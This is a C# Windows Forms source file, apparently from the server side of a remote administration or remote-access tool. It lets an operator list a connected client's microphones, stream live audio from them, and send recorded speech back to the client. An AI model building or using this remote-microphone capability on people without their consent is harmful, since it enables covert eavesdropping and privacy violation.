using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Windows.Forms;
using NAudio.Wave;
using xServer.Core.NAudio.Wave;
using xServer.Core.NAudio.Wave.WaveFormats;
using xServer.Core.NAudio.Wave.WaveInputs;
using xServer.Core.NAudio.Wave.WaveOutputs;
using xServer.Core.Networking;
using xServer.Core.Packets.ClientPackets;

namespace xServer.Forms {
    public partial class FrmMicrophone : Form {

        private readonly Client _connectClient;

        #region Properties

        public bool StreamRunning { get; set; }

        private Dictionary<string, int> AudioDevices { get; set; }

        private byte[] AudioStream { get; set; }

        private WaveOut WaveOut { get; set; }

        public WaveFormat WaveFormat { get; set; }

        public WaveInEvent WaveInEvent { get; set; }

        public int Device { get; set; }

        public byte[] SpokenData { get; set; }

        private BufferedWaveProvider waveProvider { get; set; }
        #endregion 

        public FrmMicrophone(Client c) {
            _connectClient = c;
            _connectClient.Value.FrmMic = this;

            InitializeNAudio();
            InitializeComponent();
        }

        private void InitializeNAudio() {
            WaveOut = new WaveOut();
            waveProvider = new BufferedWaveProvider(new WaveFormat());
            WaveOut.Init(waveProvider);

            Device = WaveIn.DeviceCount;
            if (Device == 0) {
                return;
            }

            WaveFormat = new WaveFormat(44100, 2);
            WaveInEvent = new WaveInEvent {
                BufferMilliseconds = 50,
                DeviceNumber = 0,
                WaveFormat = WaveFormat
            };
        }

        private void FrmMicrophone_Load(object sender, EventArgs e) {
            if(_connectClient.Value != null)
                new Core.Packets.ServerPackets.GetAudioDevices().Execute(_connectClient);
        }

        public void AddAudioDevices(Dictionary<string, int> audioDevices) {
            AudioDevices = audioDevices;
            try {
                cbAudioDevices.Invoke((MethodInvoker)delegate {
                    foreach(var audio in audioDevices) {
                        cbAudioDevices.Items.Add($"{audio.Key}");
                        cbChannels.Items.Add($"{audio.Value}");
                    }
                    cbAudioDevices.SelectedIndex = 0;
                    cbChannels.SelectedIndex = 0;
                    cbSampleRate.SelectedIndex = 5;
                });
            }
            catch(InvalidOperationException) {
            }
        }

        public void PlayAudioStream(byte[] audioStream) {
            AudioStream = audioStream;
            try {
                StreamRunning = true;
                cbAudioDevices.Invoke((MethodInvoker) delegate {
                    waveProvider.AddSamples(audioStream, 0, audioStream.Length);
                    WaveOut.Play();
                });
            }
            catch (Exception ex) {
                Debug.WriteLine(ex.Message);
            }
        }

        private void btnCapture_Click(object sender, EventArgs e) {
            if(cbAudioDevices.Items.Count == 0) {
                MessageBox.Show("No Microphone detected.\nPlease wait till the client sends a list with available Microphones.",
                    "Starting failed", MessageBoxButtons.OK, MessageBoxIcon.Warning);
                return;
            }

            if (StreamRunning) {
                MessageBox.Show("Microphone stream already running!",
                    "Information", MessageBoxButtons.OK, MessageBoxIcon.Information);
                return;
            }

            int selectedChannel = Convert.ToInt32(cbChannels.Text);
            int selectedSampleRate = Convert.ToInt32(cbSampleRate.Text);
            new Core.Packets.ServerPackets.GetAudioStream(cbAudioDevices.SelectedIndex,
                selectedChannel, selectedSampleRate).Execute(_connectClient);
        }

        private void btnStop_Click(object sender, EventArgs e) {
            new Core.Packets.ServerPackets.StopAudioStream().Execute(_connectClient);
        }

        public void StopAudioStream(bool streamStopped) {
            StreamRunning = streamStopped;
        }

        private void FrmMicrophone_FormClosing(object sender, FormClosingEventArgs e) {
            if (StreamRunning) {
                new Core.Packets.ServerPackets.StopAudioStream().Execute(_connectClient);
            }
            if(_connectClient.Value != null)
                _connectClient.Value.FrmMic = null;
        }

        private void btnSpeak_MouseDown(object sender, MouseEventArgs e) {
            if (Device == 0) {
                MessageBox.Show("No Microphone found!", "Information", MessageBoxButtons.OK, MessageBoxIcon.Information);
            }
            WaveInEvent.StartRecording();
            WaveInEvent.DataAvailable += (s, args) => {
                SpokenData = args.Buffer;
            };
        }

        private void btnSpeak_MouseUp(object sender, MouseEventArgs e) {
            WaveInEvent.StopRecording();

            if (SpokenData.Length != 0) {
                new Core.Packets.ServerPackets.DoSpeak(SpokenData).Execute(_connectClient);
            }
            WaveInEvent.Dispose();
        }
    }
}
